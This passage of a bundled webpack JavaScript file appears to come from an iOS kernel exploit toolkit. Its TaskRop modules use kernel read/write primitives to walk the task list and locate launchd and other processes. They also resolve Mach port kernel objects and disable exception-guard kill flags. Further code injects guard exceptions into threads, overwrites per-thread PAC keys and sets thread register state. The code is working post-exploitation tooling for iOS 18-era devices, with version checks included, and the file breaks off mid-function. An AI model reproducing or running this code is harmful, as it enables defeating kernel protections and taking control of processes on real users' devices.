}


/***/ }),

/***/ "./src/libs/TaskRop/SelfTaskStruct.js":
/*!********************************************!*\
  !*** ./src/libs/TaskRop/SelfTaskStruct.js ***!
  \********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ SelfTaskStruct)
/* harmony export */ });
class SelfTaskStruct 
{
	#buffer;
	#dataView;
	constructor()
	{
		this.#buffer = new ArrayBuffer(32);
		this.#dataView = new DataView(this.#buffer);
		this.addr = 0x0n;
		this.spaceTable = 0x0n;
		this.portObject = 0x0n;
		this.launchdTask = 0x0n;
	}
	get addr()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set addr(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get spaceTable()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set spaceTable(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get portObject()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set portObject(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
	get launchdTask()
	{
		return this.#dataView.getBigUint64(24,true);
	}
	set launchdTask(value)
	{
		this.#dataView.setBigUint64(24,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/Task.js":
/*!**********************************!*\
  !*** ./src/libs/TaskRop/Task.js ***!
  \**********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Task)
/* harmony export */ });
/* harmony import */ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./SelfTaskStruct */ "./src/libs/TaskRop/SelfTaskStruct.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");


const TAG = "TASK"
const TASK_EXC_GUARD_MP_CORPSE = 0x40;
const TASK_EXC_GUARD_MP_FATAL = 0x80;
const TASK_EXC_GUARD_MP_DELIVER = 0x10;

class Task
{
	static gSelfTask;
	static KALLOC_ARRAY_TYPE_SHIFT;

	static {
		this.gSelfTask = new _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();
	}

	static init(selfTaskAddr)
	{
		// Update KALLOC_ARRAY_TYPE_SHIFT
		this.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().T1SZ_BOOT - 1n));

		/*
		 * This function should be invoked as the initializer of the this Task utility.
		 * It setups the global var "gSelfTask" containing values used all across the task functions to lookup ports.
		 * It also retrieves the "launchd" task address.
		 */
		this.gSelfTask.addr = selfTaskAddr;
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		this.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);
		this.gSelfTask.launchdTask = this.#searchForLaunchdTask();

		console.log(TAG,`Self task address: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.addr)}`);
		console.log(TAG,`Self task space table: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(spaceTable)}`);
		console.log(TAG,`Self task port object: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.portObject)}`);
		console.log(TAG,`launchd task: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.launchdTask)}`);
	}

	static trunc_page(addr)
	{
		return addr & (~(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_SIZE - 1n));
	}

	static round_page(addr)
	{
		return this.trunc_page((addr) + (libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_SIZE - 1n));
	}

	static pidof(name)
	{
		let currTask = this.gSelfTask.launchdTask;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
			let resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command,18);
			if(name === resultName)
			{
				let pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
				return pid;
			}
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || nextTask == currTask)
				break;
			currTask = nextTask;
		}
		return 0;
	}

	static getTaskAddrByPID(pid)
	{
		let currTask = this.gSelfTask.launchdTask;

		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
			if (currPid == pid)
				return currTask;
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || (nextTask == currTask))
				break;
			currTask = nextTask;
		}
		return 0;
	}

	static disableExcGuardKill(taskAddr)
	{
		// in mach_port_guard_ast, the victim would crash if these are on.
		let excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard);
		//console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);
		excGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);
		excGuard |= TASK_EXC_GUARD_MP_DELIVER;
		//console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard, excGuard);
	}

	static getTaskAddrByName(name)
	{
		let currTask = this.gSelfTask.launchdTask;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
			let resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command,18);
			//console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);
			if(name === resultName)
			{
				//console.log(TAG, `Found target process: ${name}`);
				return currTask;
			}
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || nextTask == currTask)
				break;
			currTask = nextTask;
		}
		return false;
	}

	static getRightAddr(port)
	{
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		return this.#getPortEntry(spaceTable, port);
	}

	static #getSpaceTable(taskAddr)
	{
		let space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().ipcSpace);
		let spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().spaceTable);
		//console.log(TAG,`space: ${Utils.hex(space)}`);
		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
		spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(spaceTable);
		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
		return this.#kallocArrayDecodeAddr(BigInt(spaceTable));
	}

	static #mach_port_index(port)
	{
		return ((port) >> 8n);
	}

	static #getPortEntry(spaceTable, port)
	{
		let portIndex = this.#mach_port_index(port);
		return spaceTable + (portIndex * 0x18n);
	}

	static #getPortObject(spaceTable, port)
	{
		//console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);
		let portEntry = this.#getPortEntry(spaceTable, port);
		//console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);
		let portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().entryObject);
		//console.log(TAG,`portObject:${Utils.hex(portObject)}`);
		return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(portObject);
	}

	static getTaskProc(taskAddr)
	{
		let procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().procRO);
		let procAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(procROAddr);
		return procAddr;
	}

	static #searchForLaunchdTask()
	{
		/*
		 * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.
		 */

		let currTask = this.gSelfTask.addr;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
			if (currPid == 1)
				return currTask;
			let prevTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().prevTask);
			if (!prevTask || prevTask === currTask)
				break;
			currTask = prevTask;
		}
		return 0n;
	}

	static #kallocArrayDecodeAddr(ptr)
	{
		let zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);
		if (ptr & zone_mask)
		{
			ptr &= ~0x1fn;
		}
		else
		{
			ptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_MASK;
			//console.log(TAG,`ptr:${Utils.hex(ptr)}`);
			ptr |= zone_mask;
			//console.log(TAG,`ptr2:${Utils.hex(ptr)}`);
		}
		return ptr;
	}

	static getPortAddr(port)
	{
		if (!port)
			return 0;
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		return this.#getPortObject(spaceTable, port);
	}

	static getPortKObject(port)
	{
		let portObject = this.getPortAddr(port);
		return this.#getPortKObjectByAddr(portObject);
	}

	static #getPortKObjectByAddr(portObject)
	{
		if (!portObject)
			return 0;
		let kobject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portObject + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().objectKObject);
		return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(kobject);
	}

	static firstThread(taskAddr)
	{
		let first = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().threads);
		return first;
	}

	static getMap(taskAddr)
	{
		let vmMap = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().mapTask);
		return vmMap;
	}

	static getPortKObjectOfTask(taskAddr,port)
	{
		let portObject = this.getPortAddrOfTask(taskAddr, port);
		return this.#getPortKObjectByAddr(portObject);
	}

	static getPortAddrOfTask(taskAddr, port)
	{
		let spaceTable = this.#getSpaceTable(taskAddr);
		return this.#getPortObject(spaceTable, port);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/TaskRop.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/TaskRop.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ TaskRop)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");


const TAG = "TASKROP"

class TaskRop
{
	static init()
	{
		let selfTaskAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].getSelfTaskAddr();
		if (!selfTaskAddr)
		{
			console.log(TAG,`Unable to find self task address`);
			return;
		}	
		console.log(TAG,`selfTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(selfTaskAddr)}`);
		_Task__WEBPACK_IMPORTED_MODULE_2__["default"].init(selfTaskAddr);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/Thread.js":
/*!************************************!*\
  !*** ./src/libs/TaskRop/Thread.js ***!
  \************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Thread)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");


const AST_GUARD = 0x1000;
const TAG = "THREAD";

class Thread
{
	static getTro(thread)
	{
		let tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().tro);
		// Ignore threads with invalid tro address.
		if (!(tro & 0xf000000000000000n))
		{
			//console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);
			return 0n;
		}
		return tro;
	}
	static getCtid(thread)
	{
		let ctid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ctid);
		return ctid;
	}
	static getTask(thread)
	{
		let tro = this.getTro(thread);
		// Ignore threads with invalid tro address.
		if (!(tro & 0xf000000000000000n) || tro === 0n)
			return 0n;
		let task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().troTask);
		return task;
	}
	static next(thread)
	{
		if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].strip(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads) < 0xffffffd000000000n)
			return 0;
		let next = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads);
		if (next < 0xffffffd000000000n)
			return 0;
		return next;
	}
	static setMutex(thread,ctid)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData, ctid);
	}
	static getMutex(thread)
	{
		let mutex = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData);
		return mutex;
	}
	static getStack(thread)
	{
		let stackptr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().kstackptr);
		return stackptr;
	}
	static injectGuardException(thread,code)
	{
		if(!this.getTro(thread))
		{
			console.log(TAG,`got invalid tro of thread, not injecting exception since thread is dead`);
			return false;
		}

		// 18.4+
		if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0x17n);
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, code);
		}
		else {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, code);
		}

		let ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
		ast |= AST_GUARD;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);
		return true;
	}
	static clearGuardException(thread)
	{
		if(!this.getTro(thread))
		{
			console.log(TAG,`got invalid tro of thread, still clearing exception to avoid crash`);
		}
		let ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
		ast &= ~AST_GUARD | 0x80000000;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);

		// 18.4+
		if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
			if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode) == 0x17n) {
				libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
				libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, 0n);
			}
		}
		else {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
		}
	}
	static getOptions(thread)
	{
		let options = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options);
		return options;
	}
	static setOptions(thread, options)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options, options);
	}
	static getRopPid(thread)
	{
		let ropPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid);
		return ropPid;
	}
	static getJopPid(thread)
	{
		let jopPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid);
		return jopPid;
	}
	static setPACKeys(thread, keyA, keyB)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid, keyA);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid, keyB);
	}

	static getState(machThread)
	{
		let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
		let stateCountPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem + 0x200n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write32(stateCountPtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_get_state",
			machThread,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
			statePtr,
			stateCountPtr);
		if (kr != 0) {
			console.log(TAG, "Unable to read thread state");
			return false;
		}

		let stateBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].read(statePtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_SIZE);
		let state = new _ThreadState__WEBPACK_IMPORTED_MODULE_2__["default"](stateBuff);
		return state;
	}

	static setState(machThread, threadAddr, state)
	{
		let options = 0;
		if (threadAddr) {
			options = Thread.getOptions(threadAddr);
			options |= 0x8000;
			Thread.setOptions(threadAddr, options);
		}

		let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write(statePtr, state.buffer);
		//console.log(TAG,`thread:${Utils.hex(thread)}`);
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_set_state",
			machThread,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
			statePtr,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
		if (kr != 0)
		{
			console.log(TAG,`Failed thread_set_state with error:${kr}`);
			return false;
		}

		if (threadAddr) {
			options &= ~0x8000;
			Thread.setOptions(threadAddr, options);
		}
		return true;
	}

	static resume(machThread)
	{
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_resume", machThread);
		if (kr != 0) {
			console.log(TAG, "Unable to resume suspended thread");
			return false;
		}
		return true;
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/ThreadState.js":
/*!*****************************************!*\
  !*** ./src/libs/TaskRop/ThreadState.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ThreadState)
/* harmony export */ });
/* harmony import */ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./RegistersStruct */ "./src/libs/TaskRop/RegistersStruct.js");


class ThreadState
{
	#buffer;
	#dataView;
	constructor(buffer, offset = 0)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(buffer,offset);
		this.registers = new _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__["default"](buffer,offset);
	}
	get buffer()
	{
		return this.#buffer;
	}
	get opaque_fp()
	{
		return this.#dataView.getBigUint64(232,true);
	}
	set opaque_fp(value)
	{
		this.#dataView.setBigUint64(232,value,true);
	}
	get opaque_lr()
	{
		return this.#dataView.getBigUint64(240,true);
	}
	set opaque_lr(value)
	{
		this.#dataView.setBigUint64(240,value,true);
	}
	get opaque_sp()
	{
		return this.#dataView.getBigUint64(248,true);
	}
	set opaque_sp(value)
	{
		this.#dataView.setBigUint64(248,value,true);
	}
	get opaque_pc()
	{
		return this.#dataView.getBigUint64(256,true);
	}
	set opaque_pc(value)
	{
		this.#dataView.setBigUint64(256,value,true);
	}
	get cpsr()
	{
		return this.#dataView.getUint32(264,true);
	}
	set cpsr(value)
	{
		this.#dataView.setUint32(264,value,true);
	}
	get opaque_flags()
	{
		return this.#dataView.getUint32(268,true);
	}
	set opaque_flags(value)
	{
		this.#dataView.setUint32(268,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VM.js":
/*!********************************!*\
  !*** ./src/libs/TaskRop/VM.js ***!
  \********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VM)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./VmMapEntry */ "./src/libs/TaskRop/VmMapEntry.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _VMObject__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./VMObject */ "./src/libs/TaskRop/VMObject.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
/* harmony import */ var _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./VmPackingParams */ "./src/libs/TaskRop/VmPackingParams.js");


const TAG = "VM";
const VME_ALIAS_BITS = 12n;
const VME_OFFSET_BITS = (64n - VME_ALIAS_BITS);
const VME_OFFSET_SHIFT = VME_ALIAS_BITS;
const VME_SUBMAP_SHIFT = 2n;
const VME_SUBMAP_BITS = (8n * 8n - VME_SUBMAP_SHIFT);
const VM_KERNEL_POINTER_SIGNIFICANT_BITS = 38;
const VM_MAX_KERNEL_ADDRESS = 0xfffffffbffffffffn;
const VM_PAGE_PACKED_PTR_BITS = 31;
const VM_PAGE_PACKED_PTR_SHIFT = 6;
const SIZE_VMOBJECT = 0x20;
const VM_LINK_SIZE = 0x20;
const VM_MAP_ENTRY_SIZE = 0x50;
const VMShmem_SIZE = 0x18;
const VMPackingSize = 0x10;
const VM_FLAGS_ANYWHERE = 0x00000001n;

class VM
{
	static VM_PROT_READ = 1n;
	static VM_PROT_WRITE = 2n;
	static VM_PROT_EXECUTE = 4n;
	static VM_PROT_ALL = (this.VM_PROT_READ|this.VM_PROT_WRITE|this.VM_PROT_EXECUTE);
	static VM_PROT_IS_MASK = 0x40n;
	static VM_INHERIT_NONE = 2n;

	static #Tib(x)
	{
		return ((0n + (x)) << 40n);
	}
	static #Gib(x)
	{
		return ((0n + (x)) << 30n);
	}
	static #VM_MIN_KERNEL_ADDRESS()
	{
		return ((0n - this.#Gib(144n)));
	}
	static #VM_MIN_KERNEL_AND_KEXT_ADDRESS()
	{
		return this.#VM_MIN_KERNEL_ADDRESS();
	}
	static #VM_PAGE_PACKED_PTR_BASE()
	{
		return this.#VM_MIN_KERNEL_AND_KEXT_ADDRESS();
	}
	static #VM_PACKING_IS_BASE_RELATIVE(packed)
	{
		return ((packed.vmpp_bits + packed.vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS);
	}
	static #VM_PACKING_PARAMS(ns)
	{
		ns.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(ns);
		return ns;
	}
	static #VM_UNPACK_POINTER(packed, ns)
	{
		return this.#vm_unpack_pointer(packed,this.#VM_PACKING_PARAMS(ns));
	}
	static #VM_PACK_POINTER(ptr, ns)
	{
		return this.#vm_pack_pointer(ptr, this.#VM_PACKING_PARAMS(ns));
	}
	static #bigUint64ToIntptr(bigUint64) {
		// Create a BigInt mask for the lower 64 bits
		const lower64BitsMask = BigInt("0xFFFFFFFFFFFFFFFF");

		// Apply the mask to ensure the value is within the range of 64 bits
		bigUint64 = bigUint64 & lower64BitsMask;

		// Check if the value is greater than the maximum signed 64-bit integer
		if (bigUint64 > BigInt("0x7FFFFFFFFFFFFFFF")) {
			// Convert to signed by subtracting 2^64
			return Number(bigUint64 - BigInt("0x10000000000000000"));
		} else {
			// Directly convert to Number
